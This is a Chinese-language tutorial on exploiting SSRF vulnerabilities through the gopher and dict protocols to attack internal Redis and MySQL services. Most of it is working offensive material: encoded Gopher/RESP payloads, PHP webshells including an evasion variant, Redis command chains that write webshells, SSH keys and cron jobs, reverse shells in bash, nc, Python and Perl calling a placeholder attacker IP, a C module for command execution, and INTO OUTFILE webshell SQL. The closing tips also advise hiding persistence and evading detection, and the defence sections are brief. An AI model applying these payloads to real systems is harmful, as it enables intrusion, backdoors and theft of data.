# 1.概述

## 1.1 原理

- **核心原理**

```
攻击者 → 构造恶意URL → 存在SSRF漏洞的服务器 → 向内网服务发起请求 → 获取响应或执行命令

```

- **流程**

1. 外网攻击者无法直接访问内网服务（如Redis、MySQL等）
2. 攻击者找到一个存在SSRF漏洞的Web应用（该应用可以访问内网）
3. 攻击者构造特殊的URL，让Web应用代替攻击者去访问内网服务
4. 内网服务将响应返回给Web应用，Web应用再返回给攻击者

- **关键点**

1. 利用服务器的"信任关系"：内网服务信任来自内网的请求

2. 突破网络边界：外网→内网的访问限制被绕过

3. 协议转换：通过HTTP/HTTPS协议携带其他协议的数据包

## 1.2 常见攻击目标

**Redis（6379端口）**

- 未授权访问时可直接操作
- 可写入WebShell、SSH公钥、计划任务
- 主从复制可实现RCE

**MySQL（3306端口）**

- 可读取服务器本地文件（LOAD DATA LOCAL INFILE）
- 可写入WebShell（INTO OUTFILE）
- 可能通过UDF提权

**FastCGI（9000端口）**

- PHP-FPM服务
- 可执行任意PHP代码
- 直接GetShell

**其他目标**

- Memcached（11211端口）：缓存投毒
- SMTP（25端口）：发送钓鱼邮件
- HTTP内网服务：探测内网拓扑、访问管理后台
- Docker API（2375端口）：容器逃逸

## 1.3 攻击前提

### 1.3.1 服务器端条件

1. **存在SSRF漏洞点**
   - 应用接受URL参数并发起请求
   - 未对URL进行严格过滤
   - 支持多种协议（http、gopher、dict、file等）
2. **目标服务可达**
   - 服务器能访问到内网目标服务
   - 目标服务端口开放
   - 网络策略允许访问
3. **协议支持**
   - 服务器支持Gopher协议（最关键）
   - 或支持Dict协议（功能受限）

### 1.3.2 目标服务条件

1. **Redis攻击条件**
   - Redis未设置密码或弱密码
   - 未绑定127.0.0.1（允许远程连接）
   - 有写入权限的目录（web目录、ssh目录、cron目录）
2. **MySQL攻击条件**
   - 知道或能爆破MySQL账号密码
   - MySQL开启了local_infile功能
   - 有文件写入权限（secure_file_priv未限制）

# 2. 协议

## 2.1 Gopher协议

### 2.1.1 简介

这个在SSRF中已经讲过，这里再说一下。

这是一种万能协议，能发送任意TCP数据包，不用遵守特定的协议格式，支持GET、POST请求，也能模拟几乎所有的基于TCP的协议

```
HTTP协议：只能发送HTTP格式的数据
Gopher协议：可以发送任意二进制数据

这意味着：
- 可以构造Redis协议数据包
- 可以构造MySQL协议数据包
- 可以构造FastCGI协议数据包
- 可以构造SMTP协议数据包

```

**支持Gopher的库/函数**

```
PHP：curl（需要编译时启用）
Python：urllib、requests
Java：部分HTTP客户端库
Go：net/http（需要注册协议）

```

### 2.1.2 Gopher协议格式

**基本格式**

```
gopher://[host]:[port]/[type][content]

```

**详细说明**

```
gopher://127.0.0.1:6379/_[payload]
       └─────┬─────┘ └─┬─┘ │ └───┬───┘
            主机      端口  │   数据内容
                          类型标识符

```

**类型表示符(Type)**

- `_`（下划线）：最常用，表示发送原始TCP数据
- `0`：文本文件
- `1`：目录
- `其他`：基本不用

**实际例子**

```

# 攻击Redis
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a

# 攻击MySQL
gopher://127.0.0.1:3306/_[MySQL握手包+认证包+查询包]

# 攻击FastCGI
gopher://127.0.0.1:9000/_[FastCGI数据包]

```

### 2.1.3 URL编码

**需要URL编码的原因**

1. Gopher数据包中包含特殊字符（换行符、空格等）
2. 浏览器/HTTP客户端会对URL进行解析
3. 需要确保数据包完整传输

**编码规则**

```
原始字符 → URL编码
空格     → %20
换行符   → %0d%0a（CRLF）
*        → %2a
$        → %24

```

**二次编码**

```python

# 原始Redis命令
set shell "<?php eval($_POST[cmd]);?>"

# 转换为RESP协议
*3\r\n$3\r\nset\r\n$5\r\nshell\r\n$27\r\n<?php eval($_POST[cmd]);?>\r\n

# 一次URL编码
*3%0d%0a$3%0d%0aset%0d%0a$5%0d%0ashell%0d%0a$27%0d%0a<?php eval($_POST[cmd]);?>%0d%0a

# 二次URL编码（实际使用）
*3%250d%250a$3%250d%250aset%250d%250a$5%250d%250ashell%250d%250a$27%250d%250a<?php eval($_POST[cmd]);?>%250d%250a

```

### 2.1.4 换行符处理

Redis、MySQL等协议都依赖换行符来分隔命令和数据

**类型**

```
\r\n  → CRLF（回车换行）→ Windows风格 → Redis使用
\n    → LF（换行）     → Unix/Linux风格
\r    → CR（回车）     → 旧Mac风格

```

**Redis协议必须使用 `\r\n`（CRLF）：**

```
正确：
*1\r\n$4\r\ninfo\r\n

错误：
*1\n$4\ninfo\n  ← 只有\n，Redis无法识别

```

**在Gopher中表示换行符**

```
方式1：直接写（不推荐，容易出错）
gopher://127.0.0.1:6379/_*1
$4
info

方式2：URL编码（推荐）
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
                              └─┬─┘      └─┬─┘
                               \r\n       \r\n

```

**注意事项：**

1. **Gopher协议会吃掉第一个字符**

```

# 错误
gopher://127.0.0.1:6379/*1%0d%0a$4%0d%0ainfo%0d%0a

# 正确（在前面加下划线_）
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a                                                

```

2. **某些curl版本的bug**

```

# 某些curl版本会吃掉第一行的换行符

# 解决方法：在最前面多加一个%0d%0a
gopher://127.0.0.1:6379/_%0d%0a*1%0d%0a$4%0d%0ainfo%0d%0a

```

## 2.2 Dict协议

### 2.2.1 简介

一个字典查询协议，基本信息：

- 默认端口：2628
- 用途：查询字典服务器
- 在SSRF中的作用：探测端口、发送简单命令

**格式**

```
dict://[host]:[port]/[command]:[parameter]

```

**示例**

```

# 探测Redis端口
dict://127.0.0.1:6379/info

# 探测MySQL端口
dict://127.0.0.1:3306/info

```

### 2.2.2 使用场景

- **端口探测**

```
dict://192.168.1.1:22/info    → SSH端口
dict://192.168.1.1:3306/info  → MySQL端口
dict://192.168.1.1:6379/info  → Redis端口
dict://192.168.1.1:8080/info  → Web服务

```

通过返回结果判断端口是否开放：

<u>端口开放</u>：返回服务的响应信息

<u>端口关闭</u>：连接超时或拒绝

- **攻击Redis(有限)**

```

# 查看Redis信息
dict://127.0.0.1:6379/info

# 设置键值（简单命令）
dict://127.0.0.1:6379/set:key:value

```

- **内网服务探测**

```python

# 批量探测内网C段
for i in range(1, 255):
    url = f"dict://192.168.1.{i}:6379/info"

    # 发送SSRF请求

```

### 2.2.3 局限

**与Gopher协议对比：**

| 特性           | Dict协议     | Gopher协议 |
| -------------- | ------------ | ---------- |
| 发送复杂数据包 | ❌ 不支持     | ✅ 支持     |
| 换行符控制     | ❌ 受限       | ✅ 完全控制 |
| 二进制数据     | ❌ 不支持     | ✅ 支持     |
| 攻击Redis      | ⚠️ 仅简单命令 | ✅ 完整攻击 |
| 攻击MySQL      | ❌ 无法攻击   | ✅ 可以攻击 |
| 端口探测       | ✅ 支持       | ✅ 支持     |

**Dict协议的限制：**

1. **无法发送复杂命令**

```

# 无法执行（需要换行符）
dict://127.0.0.1:6379/config set dir /var/www/html

```

2. **无法发送二进制数据**

```

# 无法发送MySQL握手包（包含二进制数据）

```

3. **命令格式受限**

```

# Dict协议格式固定
dict://host:port/command:param

# 无法像Gopher那样自由构造

```

## 2.3 Gopher与Dict协议使用建议

```
Dict协议：用于快速端口探测、简单信息收集
Gopher协议：用于实际攻击、复杂payload构造

攻击流程：
1. 使用Dict协议探测内网存活主机和开放端口
2. 使用Gopher协议构造攻击payload进行深度利用

```

# 3. 攻击Redis

## 3.1 Redis基础

### 3.1.1 Redis通信协议(RESP)

Redis使用**RESP协议**（Redis Serialization Protocol）进行客户端与服务器通信

**RESP协议格式：**

```
*<参数数量>\r\n
$<参数1字节长度>\r\n
<参数1内容>\r\n
$<参数2字节长度>\r\n
<参数2内容>\r\n
...

```

示例1：简单命令

```

# Redis命令
INFO

# RESP协议格式
*1\r\n
$4\r\n
INFO\r\n

解释：
*1       → 1个参数
$4       → 参数长度4字节
INFO     → 参数内容
\r\n     → 换行符

```

示例2：带参数的命令

```bash

# Redis命令
SET mykey "hello world"

# RESP协议格式
*3\r\n
$3\r\n
SET\r\n
$5\r\n
mykey\r\n
$11\r\n
hello world\r\n

解释：
*3           → 3个参数
$3 SET       → 第1个参数：SET（3字节）
$5 mykey     → 第2个参数：mykey（5字节）
$11 hello... → 第3个参数：hello world（11字节）

```

示例3：复杂命令

```bash

# Redis命令
CONFIG SET dir /var/www/html

# RESP协议格式
*4\r\n
$6\r\n
CONFIG\r\n
$3\r\n
SET\r\n
$3\r\n
dir\r\n
$14\r\n
/var/www/html\r\n

```

**RESP协议要点：**

1. 每个命令以 `*` 开头，表示参数数量
2. 每个参数以 `$` 开头，表示参数字节长度
3. 必须使用 `\r\n` 作为换行符
4. 字节长度必须精确计算（包括空格、特殊字符）

### 3.1.2 Redis常用命令

- **信息收集命令**

```bash
INFO                    # 查看Redis服务器信息
CONFIG GET dir          # 获取Redis工作目录
CONFIG GET dbfilename   # 获取数据库文件名
CLIENT LIST             # 查看客户端连接

```

- **配置修改命令**

```bash
CONFIG SET dir /path/to/dir              # 设置工作目录
CONFIG SET dbfilename filename.rdb       # 设置数据库文件名
CONFIG SET requirepass password          # 设置密码

```

- **数据操作命令**

```bash
SET key value           # 设置键值
GET key                 # 获取键值
FLUSHALL                # 清空所有数据
SAVE                    # 保存数据到磁盘

```

- **攻击常用命令组合**

```bash

# 写入WebShell
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET shell "<?php eval($_POST[cmd]);?>"
SAVE

# 写入SSH公钥
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET key "ssh-rsa AAAAB3NzaC1yc2E..."
SAVE

# 写入计划任务
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET cron "\n\n*/1 * * * * bash -i >& /dev/tcp/攻击者IP/端口 0>&1\n\n"
SAVE

```

### 3.13 Redis未授权访问漏洞

**漏洞成因：**

1. **未设置密码**

```bash

# redis.conf配置文件

# requirepass foobared  ← 被注释掉，未设置密码

```

2. **绑定0.0.0.0**

```bash

# redis.conf配置文件
bind 0.0.0.0  ← 允许所有IP连接

# 安全配置应该是：bind 127.0.0.1

```

3. **保护模式关闭**

```bash

# redis.conf配置文件
protected-mode no  ← 关闭保护模式

```

**漏洞危害：**

1. 任意用户可连接Redis

2. 可执行任意Redis命令

3. 可写入恶意文件

4. 可获取敏感数据

**检测方法：**

```bash

# 方法1：直接连接
redis-cli -h 目标IP -p 6379

> INFO

# 方法2：使用Nmap
nmap -p 6379 --script redis-info 目标IP

# 方法3：使用Python
import redis
r = redis.Redis(host='目标IP', port=6379, decode_responses=True)
print(r.info())

```

## 3.2 利用方法

### 3.2.1 写入webshell

**原理：**

利用Redis的数据持久化功能，将WebShell代码写入Web目录

**前提条件：**

1. Redis未授权访问或已知密码
2. 知道Web目录的绝对路径
3. Redis进程对Web目录有写权限
4. Web目录允许执行PHP/JSP等脚本

**攻击步骤：**

```bash

# 1. 连接Redis
redis-cli -h 目标IP

# 2. 设置保存目录为Web目录
CONFIG SET dir /var/www/html

# 3. 设置保存文件名
CONFIG SET dbfilename shell.php

# 4. 写入WebShell
SET shell "\n\n<?php eval($_POST['cmd']);?>\n\n"

# 5. 保存到磁盘
SAVE

```

**为什么要加`\n\n`**

```
Redis保存的RDB文件包含二进制数据：
[二进制头部]<?php eval($_POST['cmd']);?>[二进制尾部]

PHP解析器会忽略<?php?>标签外的内容
加上\n\n是为了：
1. 避免二进制数据干扰PHP代码
2. 增加代码可读性
3. 某些情况下绕过WAF

```

**常见WebShell:**

```php

# 一句话木马
<?php eval($_POST['cmd']);?>

# 稍微复杂的
<?php system($_GET['cmd']);?>

# 免杀版本
<?php $a=$_POST['a'];$b=$_POST['b'];$a($b);?>

# 使用时：POST传参 a=system&b=whoami

```

### 3.2.2 写入SSH公钥

**原理：**

将攻击者的SSH公钥写入目标服务器的 `~/.ssh/authorized_keys` 文件，实现免密登录

**前提条件：**

1. Redis未授权访问
2. Redis以root用户运行（或目标用户）
3. `/root/.ssh` 目录存在且可写
4. SSH服务开启公钥认证

**攻击步骤：**

```bash

# 1. 在攻击机生成SSH密钥对
ssh-keygen -t rsa

# 2. 查看公钥内容
cat ~/.ssh/id_rsa.pub

# 输出：ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...

# 3. 连接目标Redis
redis-cli -h 目标IP

# 4. 设置保存目录
CONFIG SET dir /root/.ssh

# 5. 设置文件名
CONFIG SET dbfilename authorized_keys

# 6. 写入公钥（注意前后加\n\n）
SET key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\n\n"

# 7. 保存
SAVE

# 8. 在攻击机SSH登录
ssh root@目标IP

```

**注意事项：**

1. **公钥格式必须正确**

```
ssh-rsa [公钥内容] [注释]

```

2. **权限问题**

```bash

# authorized_keys文件权限必须是600
chmod 600 ~/.ssh/authorized_keys

# 如果Redis保存的文件权限不对，可能无法登录

```

3. **多用户环境**

```bash

# 如果Redis不是root运行，写入对应用户目录
CONFIG SET dir /home/www/.ssh

```

### 3.2.3 写入计划人物反弹Shell

**原理：**

将反弹Shell命令写入Linux计划任务（crontab），定时执行获取Shell

**前提条件:**

1. Redis未授权访问
2. Redis以root用户运行
3. `/var/spool/cron` 目录可写
4. 目标系统支持crontab

**攻击步骤：**

```bash

# 1. 在攻击机监听端口
nc -lvnp 4444

# 2. 连接目标Redis
redis-cli -h 目标IP

# 3. 设置保存目录
CONFIG SET dir /var/spool/cron

# 4. 设置文件名（root用户的crontab文件）
CONFIG SET dbfilename root

# 5. 写入计划任务（每分钟执行一次反弹Shell）
SET cron "\n\n*/1 * * * * bash -i >& /dev/tcp/攻击者IP/4444 0>&1\n\n"

# 6. 保存
SAVE

# 7. 等待计划任务执行（最多1分钟）

```

**Crontab格式说明：**

```
*/1 * * * * 命令
│  │ │ │ │
│  │ │ │ └─ 星期几（0-7，0和7都表示周日）
│  │ │ └─── 月份（1-12）
│  │ └───── 日期（1-31）
│  └─────── 小时（0-23）
└────────── 分钟（0-59）

*/1 表示每1分钟执行一次

```

**反弹Shell命令变种：**

```bash

# Bash反弹Shell
bash -i >& /dev/tcp/攻击者IP/端口 0>&1

# NC反弹Shell
nc 攻击者IP 端口 -e /bin/bash

# Python反弹Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击者IP",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# Perl反弹Shell
perl -e 'use Socket;$i="攻击者IP";$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

**注意事项：**

1. **不同Linux发行版crontab路径不同**

```bash

# CentOS/RedHat
/var/spool/cron/root

# Ubuntu/Debian
/var/spool/cron/crontabs/root

```

2. **需要前后加`\n\n`**

```
原因：Redis保存的RDB文件包含二进制数据
crontab解析时会忽略格式错误的行
加\n\n确保计划任务独立成行

```

3. **防火墙可能阻止反弹连接**

```bash

# 可以尝试使用常见端口
80、443、53、8080等

```

### 3.2.4 主从复制RCE

**原理：**

Redis主从复制功能允许从服务器完全复制主服务器的数据。攻击者可以：

1. 搭建恶意Redis主服务器
2. 让目标Redis成为从服务器
3. 主服务器发送恶意模块（.so文件）
4. 从服务器加载模块并执行任意命令

**前提条件：**

1. Redis未授权访问
2. Redis版本 >= 4.x（支持模块功能）
3. 攻击者能搭建恶意Redis服务器
4. 目标Redis能连接到攻击者服务器

**攻击步骤：**

```bash

# 1. 编译恶意Redis模块

# 下载exp.c源码，编译成exp.so
gcc -fPIC -shared -o exp.so exp.c

# 2. 使用工具自动化攻击（推荐）

python3 redis-rogue-server.py --rhost 目标IP --rport 6379 --lhost 攻击者IP --lport 21000

# 3. 执行系统命令
```

**手工攻击流程：**

```bash
# 2. 连接目标Redis
redis-cli -h 目标IP

# 5. 执行命令

# 6. 清理痕迹
```

**恶意模块示例代码(exp.c):**

```c
#include "redismodule.h"
#include <stdlib.h>

int SystemExec_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) {
        return RedisModule_WrongArity(ctx);
    }
    
    size_t len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &len);
    
    FILE *fp = popen(cmd, "r");
    char buffer[1024];
    RedisModuleString *result = RedisModule_CreateString(ctx, "", 0);
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        RedisModule_StringAppendBuffer(ctx, result, buffer, strlen(buffer));
    }
    
    pclose(fp);
    RedisModule_ReplyWithString(ctx, result);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    if (RedisModule_CreateCommand(ctx, "system.exec", SystemExec_RedisCommand, "readonly", 0, 0, 0) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    
    return REDISMODULE_OK;
}

```

**优势：**

- 不需要知道Web目录路径
- 不需要写文件

## 3.3 Gopher协议构造

### 3.3.1 手工构造Gopher数据包

手工构造Gopher数据包，核心是按照目标协议（如Redis的RESP）构造原始数据包，再将其转成URL编码

**示例：**

Redis命令：

```
SET mykey myvalue

```

RESP格式：

```
*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$7\r\nmyvalue\r\n

```

编码为ASCII实际字符串：

```
*3
$3
SET
$5
mykey
$7
myvalue

```

用URL编码：

```
*3%0d%0a$3%0d%0aSET%0d%0a$5%0d%0amykey%0d%0a$7%0d%0amyvalue%0d%0a

```

构造完整的Gopher URL：

```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$5%0d%0amykey%0d%0a$7%0d%0amyvalue%0d%0a

```

**构造要点：**

```
“_”表示发送的是二进制原始数据

必须确保所有\r\n编码成%0d%0a

注意第一字符被Gopher协议吞掉，确保包头无误

手动构造时容易出错，建议借助工具

```

### 3.3.2 使用工具生成Gopher Payload

**常用工具示例：**

- **Gopher (Python)**

```bash
python gopherus.py --exploit redis --command "set mykey myvalue"

```

- **SSRFmap**

```bash
python ssrfmap.py -u "http://target.com/fetch?url=xxURLxx" -m redis

```

- **BP插件**

使用“Gopher Encoder”插件自动构造并编码Payload

**工具优势：**

```
自动计算字节长度
自动转义特殊字符
支持多种协议（Redis、MySQL、SMTP等）
快速生成高可用Payload

```

### 3.3.3 URL编码处理

**编码原则：**

```
所有特殊字符（\r\n，空格，*, $, 其他特殊符号）必须转为对应的URL编码

回车换行必须是%0d%0a，不能只用%0a

部分环境需二次URL编码（将第一次编码的%编码为%25）

```

**示例：**

```
字符\r → %0d
字符\n → %0a
字符* → %2a
字符$ → %24
字符  → %20

```

**二次编码演示：**

```
第一次编码：%0d%0a
第二次编码：%250d%250a

```

## 3.4 攻击流程

### 3.4.1 探测Redis服务

**方法：**

- 使用Dict协议快速探测端口

```
dict://127.0.0.1:6379/info

```

- 使用Nmap脚本扫描

```bash
nmap -p 6379 --script redis-info target_ip

```

- 使用Redis客户端测试

```bash
redis-cli -h target_ip -p 6379 ping

```

如果返回`PONG`，说明Redis服务可达

### 3.4.2 构造攻击载荷

- 根据目标服务地址和端口，手工或用工具构造Gopher协议Payload
- Payload内容依据攻击目标设计（写Webshell、写SSH公钥、修改配置等）
- 进行URL编码，确保数据包格式正确

### 3.4.3 发送请求

- 利用SSRF漏洞点发送构造好的Gopher Payload
- 常见方式：

```
http://vulnerable.com/fetch?url=gopher://127.0.0.1:6379/_<payload>

```

- 注意部分网络环境需二次编码或加重定向绕过过滤

### 3.4.4 验证攻击效果

- 访问WebShell或其他写入路径验证
- 使用SSH登录验证公钥是否生效
- 检查计划任务是否成功写入执行
- 通过SSRF请求查看Redis信息确认修改

## 3.5 防御措施

### 应用层防御

1. **严格验证和过滤输入URL**
   - 限制非白名单协议（仅http/https）
   - 阻断内网地址访问（127.0.0.1、10.x.x.x、192.168.x.x）
   - 过滤危险协议（gopher://、dict://、file://）
2. **禁用或限制SSRF点**
   - 避免不必要的服务器端请求
   - 对请求参数强制解析和规范化

### 服务层防御

1. **设置Redis和MySQL强密码**
2. **绑定服务仅监听本地回环地址**
3. **关闭不必要的功能**
   - Redis关闭保护模式关闭
   - MySQL关闭local_infile等

### 网络层防御

1. **内外网分段隔离，限制服务器访问权限**
2. **防火墙限制对外连接和访问**
3. **监控异常流量和请求频次**

### 监控与响应

1. **审计Redis、MySQL连接及命令日志**
2. **检测异常请求和Payload**
3. **使用WAF或IPS检测恶意访问**

# 4. 攻击MySQL

## 4.1 MySQL基础

### 4.1.1 MySQL通信协议

MySQL使用自定义二进制通信协议：

- 基于TCP协议
- 包含握手包、认证包、命令包和结果包
- 每个包格式：
  - 3字节包长度
  - 1字节包序号
  - 数据内容

### 4.1.2 MySQL认证流程

1. **服务器发送握手包**
   - 包含协议版本和随机盐（salt）
2. **客户端发送认证包**
   - 包含用户名、密码的加密摘要（基于salt）

### 4.1.3 MySQL客户端与服务端交互

- 连接成功后，客户端发送SQL查询包
- 服务器执行SQL并返回数据包
- 查询语言支持多种SQL命令，如SELECT、LOAD DATA LOCAL INFILE、INTO OUTFILE等

## 4.2 利用方式

### 4.2.1 读取本地文件(LOAD DATA LOCAL INFILE)

- 通过SQL命令从服务器本地加载文件数据

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE tmp_table;

```

- SSRF场景中可读取任意文件内容获取服务器敏感信息

### 4.2.2 写入WebShell (INTO OUTFILE)

- 通过SQL命令将攻击代码写入Web目录作为文件

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

```

- 成功后访问shell.php实现远程命令执行

### 4.2.3 UDF提权

- 利用自定义函数（User Defined Function）
- 上传恶意.so共享库文件
- 注入并执行任意系统命令
- 需要MySQL FILE权限和写权限

## 4.3 Gopher协议构造

### 4.3.1 MySQL握手包分析

- 握手包由服务器发送，包含协议版本、服务器版本、salt等
- 攻击者模拟握手包需复现该结构

### 4.3.2 认证包构造

- 根据握手包中的salt对密码进行加密
- 构造认证响应包，包含用户名、认证信息

### 4.3.3 查询包构造

- 构造MySQL正常的SQL查询包，内含攻击语句（例如LOAD DATA、INTO OUTFILE）

### 4.3.4 完整Payload生成

- 整合握手包、认证包、查询包完成一次完整“虚假MySQL连接”过程
- 通过SSRF触发该Payload对MySQL服务进行攻击

## 4.4 攻击流程

### 4.4.1 探测MySQL服务

- 使用nmap或Dict协议检测3306端口开放状态
- 发送握手探测包

### 4.4.2 构造恶意MySQL服务器

- 在攻击机上搭建模拟MySQL服务器
- 发送异常握手包引诱目标服务器连接攻击机，触发恶意代码（高阶技巧）

### 4.4.3 利用SSRF触发连接

- 通过漏洞服务器发送Gopher协议Payload
- 执行MySQL认证和攻击操作

### 4.4.4 读取敏感文件

- 触发LOAD DATA LOCAL INFILE读取敏感文件
- 触发INTO OUTFILE写入WebShell

## 4.5 防御措施

- 严格限制MySQL监听地址（仅本机）
- 设置强密码和关闭远程访问
- 禁用local_infile功能
- 限制INTO OUTFILE写入路径
- 启用MySQL连接白名单和安全插件
- 网络分段和防火墙控制
- 监控异常SQL命令和连接行为

# 5. 区别与总结

## 5.1 Redis与MySQL攻击的异同

| 方面                 | Redis攻击                                           | MySQL攻击                                              |
| -------------------- | --------------------------------------------------- | ------------------------------------------------------ |
| **协议类型**         | 基于RESP协议，纯文本协议，条理清晰                  | 自定义二进制协议, 较复杂，需握手和认证                 |
| **授权机制**         | 主要依赖是否设置密码和保护模式                      | 需用户名密码认证，密码破解较难                         |
| **攻击载荷构造难度** | 较低，RESP协议简单，手工构造较易                    | 较高，需要完整握手、认证包构造                         |
| **攻击手段**         | 写文件（WebShell/SSH公钥/Crontab脚本）、主从复制RCE | 读取文件（LOAD DATA）、写文件（INTO OUTFILE）、UDF提权 |
| **协议利用协议**     | Gopher协议便利，这极大简化Payload构造               | Gopher协议利用更复杂，需模拟MySQL握手和认证过程        |
| **攻击目标**         | 配置文件、Web根目录、Cron目录等具写权限路径         | Web根目录、数据库文件目录、bin目录等                   |
| **典型影响**         | 远程命令执行，持久化后门，内网横向渗透              | 读取敏感文件，远程代码执行，权限提升                   |
| **防御重点**         | 密码配置、绑定127.0.0.1、禁用远程访问               | 强密码、关闭local_infile、限制文件写权限               |
| **攻击成功率**       | 相对较高，因Redis默认配置常不安全                   | 较低，由于MySQL认证机制和权限限制                      |

## 5.2 攻击成功率影响因素

1. **服务配置安全性**
   - Redis是否设置了强密码，是否绑定限制本地地址
   - MySQL是否关闭了local_infile功能，是否使用了复杂密码
2. **协议支持**
   - 目标服务器是否支持gopher协议（尤其是构造Payload阶段）
3. **网络环境**
   - 目标应用服务器与内网服务的连通性
   - 防火墙、网络ACL对目标端口的过滤和阻断
4. **漏洞点存在与否**
   - SSRF漏洞是否存在，漏洞点是否允许访问目标协议和端口
5. **过滤与绕过机制**
   - 应用对输入URL的过滤（协议限制、IP白名单、重定向限制）
   - 是否存在跳转重定向绕过
6. **Payload构造正确性**
   - 协议包格式是否准确，编码是否正确
   - 是否考虑了服务协议特性（换行、分包等）
7. **目标系统权限**
   - Redis进程用户是否有对应目录写权限
   - MySQL账号权限是否足够读取或写入文件
8. **时间和环境影响**
   - 服务器负载、响应时间，是否存在慢查询影响

## 5.3 实战中的注意事项

1. **环境确认**
   - 首先要确认目标服务存在并可访问
   - 利用探测命令（Info、Ping）验证状态
2. **协议细节把握**
   - 熟悉Redis RESP格式，MySQL二进制协议
   - 把控好换行符、包长度及编码
3. **工具辅助**
   - 推荐借助工具生成Payload，减少手工出错
   - 例如Gopherus、SSRFmap等
4. **绕过机制**
   - 关注目标服务器的URL过滤与重定向规则
   - 善用跳转链和二次编码绕过拦截
5. **安全测试伦理**
   - 合法授权许可环境测试
   - 避免破坏生产环境数据
6. **多阶段渗透**
   - SSRF攻击往往是多步骤，探测→攻击→提权→持久化
   - 保持链路整洁，留有恢复路径
7. **日志留意**
   - 关注目标服务和中间设备日志，用于判定成功与否
8. **持久化与掩盖**
   - 攻击后考虑隐蔽性，防止被发现和追踪
9. **搭配其他漏洞**
   - SSRF往往结合其他漏洞（XXE、CSRF、命令注入等）复合利用
   - 组合攻击效果更佳
